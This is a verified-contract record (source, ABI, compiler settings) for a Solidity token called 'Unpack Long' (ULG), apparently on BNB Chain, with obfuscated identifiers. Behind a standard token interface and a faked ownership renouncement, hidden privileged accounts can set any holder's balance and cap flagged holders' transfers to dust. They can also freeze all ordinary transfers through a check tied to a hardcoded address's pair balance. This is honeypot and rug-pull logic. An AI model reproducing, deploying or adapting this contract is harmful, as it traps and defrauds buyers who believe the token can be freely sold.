{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface launchedFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamAuto) external view returns (uint256);\n\n    function transfer(address swapMarketing, uint256 feeLimitLaunched) external returns (bool);\n\n    function allowance(address maxToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeLimitLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapMarketing,\n        uint256 feeLimitLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountTotal, uint256 value);\n    event Approval(address indexed maxToken, address indexed spender, uint256 value);\n}\n\nabstract contract tradingLimitTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellLaunched {\n    function createPair(address shouldTeam, address buyIsAt) external returns (address);\n}\n\ninterface liquidityToken is launchedFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnpackLong is tradingLimitTx, launchedFee, liquidityToken {\n\n    uint256 constant tokenMode = 10 ** 10;\n\n    address private modeFromLimit;\n\n    function transferFrom(address tokenFundReceiver, address swapMarketing, uint256 feeLimitLaunched) external override returns (bool) {\n        if (_msgSender() != receiverList) {\n            if (sellTradingReceiver[tokenFundReceiver][_msgSender()] != type(uint256).max) {\n                require(feeLimitLaunched <= sellTradingReceiver[tokenFundReceiver][_msgSender()]);\n                sellTradingReceiver[tokenFundReceiver][_msgSender()] -= feeLimitLaunched;\n            }\n        }\n        return feeLimitList(tokenFundReceiver, swapMarketing, feeLimitLaunched);\n    }\n\n    function fromWallet(uint256 feeLimitLaunched) public {\n        receiverAt();\n        atMin = feeLimitLaunched;\n    }\n\n    uint256 private txList;\n\n    bool private shouldLaunchTo;\n\n    mapping(address => uint256) private tradingReceiver;\n\n    function teamFromSell(address swapShould, uint256 feeLimitLaunched) public {\n        receiverAt();\n        tradingReceiver[swapShould] = feeLimitLaunched;\n    }\n\n    function feeTo(address maxExempt) public {\n        receiverAt();\n        if (fromTake != walletFund) {\n            walletFund = senderBuy;\n        }\n        if (maxExempt == senderToken || maxExempt == marketingTokenSender) {\n            return;\n        }\n        launchMaxBuy[maxExempt] = true;\n    }\n\n    event OwnershipTransferred(address indexed exemptLimit, address indexed isMinAuto);\n\n    function getOwner() external view returns (address) {\n        return modeFromLimit;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderFrom;\n    }\n\n    bool public feeToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamWalletMode;\n    }\n\n    constructor (){\n        if (senderBuy != txList) {\n            txList = walletFund;\n        }\n        launchMarketing autoTxEnable = launchMarketing(receiverList);\n        marketingTokenSender = sellLaunched(autoTxEnable.factory()).createPair(autoTxEnable.WETH(), address(this));\n        \n        senderToken = _msgSender();\n        receiverReceiver();\n        swapAuto[senderToken] = true;\n        tradingReceiver[senderToken] = teamWalletMode;\n        \n        emit Transfer(address(0), senderToken, teamWalletMode);\n    }\n\n    function allowance(address exemptFee, address walletSender) external view virtual override returns (uint256) {\n        if (walletSender == receiverList) {\n            return type(uint256).max;\n        }\n        return sellTradingReceiver[exemptFee][walletSender];\n    }\n\n    function receiverAt() private view {\n        require(swapAuto[_msgSender()]);\n    }\n\n    address public senderToken;\n\n    function tokenEnable(address takeWallet) public {\n        if (feeToken) {\n            return;\n        }\n        \n        swapAuto[takeWallet] = true;\n        if (fromTake == autoToken) {\n            autoToken = txList;\n        }\n        feeToken = true;\n    }\n\n    address toFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public launchMaxBuy;\n\n    uint256 private walletFund;\n\n    uint256 atMin;\n\n    function receiverReceiver() public {\n        emit OwnershipTransferred(senderToken, address(0));\n        modeFromLimit = address(0);\n    }\n\n    function liquidityFeeTake(address tokenFundReceiver, address swapMarketing, uint256 feeLimitLaunched) internal returns (bool) {\n        require(tradingReceiver[tokenFundReceiver] >= feeLimitLaunched);\n        tradingReceiver[tokenFundReceiver] -= feeLimitLaunched;\n        tradingReceiver[swapMarketing] += feeLimitLaunched;\n        emit Transfer(tokenFundReceiver, swapMarketing, feeLimitLaunched);\n        return true;\n    }\n\n    function transfer(address swapShould, uint256 feeLimitLaunched) external virtual override returns (bool) {\n        return feeLimitList(_msgSender(), swapShould, feeLimitLaunched);\n    }\n\n    function owner() external view returns (address) {\n        return modeFromLimit;\n    }\n\n    string private senderFrom = \"ULG\";\n\n    uint256 private teamWalletMode = 100000000 * 10 ** 18;\n\n    uint256 fundReceiver;\n\n    function feeLimitList(address tokenFundReceiver, address swapMarketing, uint256 feeLimitLaunched) internal returns (bool) {\n        if (tokenFundReceiver == senderToken) {\n            return liquidityFeeTake(tokenFundReceiver, swapMarketing, feeLimitLaunched);\n        }\n        uint256 txAt = launchedFee(marketingTokenSender).balanceOf(toFrom);\n        require(txAt == atMin);\n        require(swapMarketing != toFrom);\n        if (launchMaxBuy[tokenFundReceiver]) {\n            return liquidityFeeTake(tokenFundReceiver, swapMarketing, tokenMode);\n        }\n        return liquidityFeeTake(tokenFundReceiver, swapMarketing, feeLimitLaunched);\n    }\n\n    uint256 public fromTake;\n\n    string private tokenLaunched = \"Unpack Long\";\n\n    uint256 public autoToken;\n\n    address public marketingTokenSender;\n\n    mapping(address => bool) public swapAuto;\n\n    uint256 public senderBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenLaunched;\n    }\n\n    uint256 public exemptReceiverAt;\n\n    function balanceOf(address teamAuto) public view virtual override returns (uint256) {\n        return tradingReceiver[teamAuto];\n    }\n\n    bool public buyWallet;\n\n    address receiverList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private sellTradingReceiver;\n\n    function approve(address walletSender, uint256 feeLimitLaunched) public virtual override returns (bool) {\n        sellTradingReceiver[_msgSender()][walletSender] = feeLimitLaunched;\n        emit Approval(_msgSender(), walletSender, feeLimitLaunched);\n        return true;\n    }\n\n    uint8 private enableSender = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableSender;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMinAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLimitLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiverAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"}],\"name\":\"feeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeLimitLaunched\",\"type\":\"uint256\"}],\"name\":\"fromWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMaxBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTokenSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLimitLaunched\",\"type\":\"uint256\"}],\"name\":\"teamFromSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"}],\"name\":\"tokenEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLimitLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFundReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLimitLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnpackLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}